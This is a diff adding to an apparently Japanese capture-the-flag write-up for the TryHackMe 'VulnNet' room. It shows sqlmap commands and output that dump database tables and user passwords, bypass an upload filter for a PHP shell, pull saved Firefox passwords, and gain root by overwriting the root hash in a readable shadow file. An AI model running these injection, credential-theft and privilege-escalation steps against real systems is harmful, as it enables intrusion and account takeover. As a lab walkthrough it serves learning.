@@ -180,13 +180,149 @@ available databases [3]:
 [*] blog
 [*] information_schema
 [*] vn_admin
-
-[16:47:04] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/api.vulnnet.thm'
 ```
 
+```
+sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=4 -p blog --dbms mysql -D vn_admin --tables --thread 10 
+
+Database: vn_admin
+[48 tables]
++---------------------------------------------+
+| backend_layout                              |
+| be_dashboards                               |
+| be_groups                                   |
+| be_users                                    |
++----------------snip-------------------------+
+| fe_groups                                   |
+| fe_sessions                                 |
+| fe_users                                    |
++---------------------------------------------+
+
+
+sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=4 -p blog --dbms mysql -D vn_admin -T be_users --columns --thread 10
+
+Database: vn_admin
+Table: be_users
+[34 columns]
++-----------------------+----------------------+
+| Column                | Type                 |
++-----------------------+----------------------+
+| admin                 | smallint(5) unsigned |
+----snip---------------------------------------+
+| password              | varchar(100)         |
+----snip---------------------------------------+
+| username              | varchar(50)          |
+----snip---------------------------------------+
+
+sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=4 -p blog --dbms mysql -D vn_admin -T be_users -C password,username --dump --thread 10 
+
+Database: vn_admin
+Table: be_users
+[1 entry]
++---------------------------------------------------------------------------------------------------+----------+
+| password                                                                                          | username |
++---------------------------------------------------------------------------------------------------+----------+
+| $argon2i$v=************************************************************************************Rg | chris_w  |
++---------------------------------------------------------------------------------------------------+----------+
+```
+
+なんかrockyouまわしたけどだめだった。もういやずら。
+
+```
+sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=4 -p blog --dbms mysql -D blog --tables --thread 10
+Database: blog
+[4 tables]
++------------+
+| blog_posts |
+| details    |
+| metadata   |
+| users      |
++------------+
+                    
+┌──(kali🦝kali)-[~/THM]
+└─$ sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=4 -p blog --dbms mysql -D blog -T users --dump --thread 10
+
+Database: blog
+Table: users
+[651 entries]
++-----+---------------------+--------------------+
+| id  | password            | username           |
++-----+---------------------+--------------------+
+| 396 | D8Gbl8mnxg          | lspikinsaz         |
+-----snip----------------------------------------
+| 651 | BIkqvmX             | rtamblingi2        |
++-----+---------------------+--------------------+
+
+[19:10:40] [INFO] table 'blog.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/users.csv'
+[19:10:40] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/api.vulnnet.thm'
+
+[*] ending @ 19:10:40 /2023-05-06/
+
+```
+ダンプしたパスワードHashをつかってみる。
+cut -d "," -f 3 > pass.txt
+
+![image](https://user-images.githubusercontent.com/6504854/236619348-67d9959b-6c96-4575-9bbd-38b43b1ce710.png)
+
+![image](https://user-images.githubusercontent.com/6504854/236619871-4cbe67f2-b01e-4002-8a11-cb9f2ccb40d9.png)
+
+ファイル制限で、アップロードできない。
+
+![image](https://user-images.githubusercontent.com/6504854/236621885-02d3c5a6-e5ff-4e5d-827b-347050aa2a97.png)
+
+Deny解除する。1.phpはいつもの。
+
 ### Flag(User)
+![image](https://user-images.githubusercontent.com/6504854/236622435-c8e3b74e-d91f-4624-833e-af9d874ef887.png)
+
+![image](https://user-images.githubusercontent.com/6504854/236623006-4982afe4-4938-4f99-a0cd-18b78f3bc04f.png)
+
+FireFoxのプロファイルからパスワードとれるツールがあるきがする。
+とりま/tmpにファイル作れたのでそちらにTarでかためておく。
+
+![image](https://user-images.githubusercontent.com/6504854/236624183-c9322118-6128-45b6-86da-67f4d3df2a2c.png)
+
+ローカルDLしてきて、ツールで解析。これを使用。
+https://github.com/unode/firefox_decrypt
+
+![image](https://user-images.githubusercontent.com/6504854/236624477-d60b0480-78d2-4e86-b635-068b5ea3477d.png)
 
 ### Flag(Root)
 
+いつもの豆。
 
-地震はくるわ、風が強すぎるわ、隠れて生きのびていこ。
+![image](https://user-images.githubusercontent.com/6504854/236628860-e61e6cf8-0345-4a86-9a11-886e11c11ee7.png)
+
+polkitはパッチあたってるっぽくダメ。sudo -lがひけなかったので、sudoもだめ。んー。
+Opensslを介して入出力できれば、できるのか？
+
+![image](https://user-images.githubusercontent.com/6504854/236630412-2aa84b35-1b1e-46d8-b1ce-b704f987c603.png)
+
+![image](https://user-images.githubusercontent.com/6504854/236630524-3933d21b-81aa-4d21-8305-7723ab5232b7.png)
+
+![image](https://user-images.githubusercontent.com/6504854/236630560-132eedac-82cd-4d6e-b377-d3fc6c585e05.png)
+
+ん？
+
+![image](https://user-images.githubusercontent.com/6504854/236630678-26609023-28f1-4211-8820-6301b9fadce9.png)
+
+書き込める先にコピー。
+
+```
+root:$6$9oaZwdNG$jrpl883V5yMMdPAFvncio.JaEw3lx7by788qoORBJ1pV5OSGlfBX/ZjkI6qAEf.7Imb7rs6iaBlI4RBxcn.5w.:19157:0:99999:7:::
+daemon:*:18885:0:99999:7:::
+gdm:*:18885:0:99999:7:::
+system:$6$9oaZwdNG$jrpl883V5yMMdPAFvncio.JaEw3lx7by788qoORBJ1pV5OSGlfBX/ZjkI6qAEf.7Imb7rs6iaBlI4RBxcn.5w.:19157:0:99999:7:::
+```
+rootのパスを同じやつに変更。
+
+![image](https://user-images.githubusercontent.com/6504854/236630976-e022a22c-5dcb-4736-8a87-54125ed1831b.png)
+
+戻して、同じパスで入れた。
+
+PwnCatやっとどうかだけどSSHつかえるならSSHして、WgetとPythonでやってるほうが早いきする。
+コマンドが老人なきがする。うぅ。
+
+👏㊗️👏㊗️👏㊗️👏㊗️👏㊗️👏㊗️
+これだけで連休つかれちゃったし、地震はくるわ、風が強すぎるわ、隠れて生きのびていこ。
+
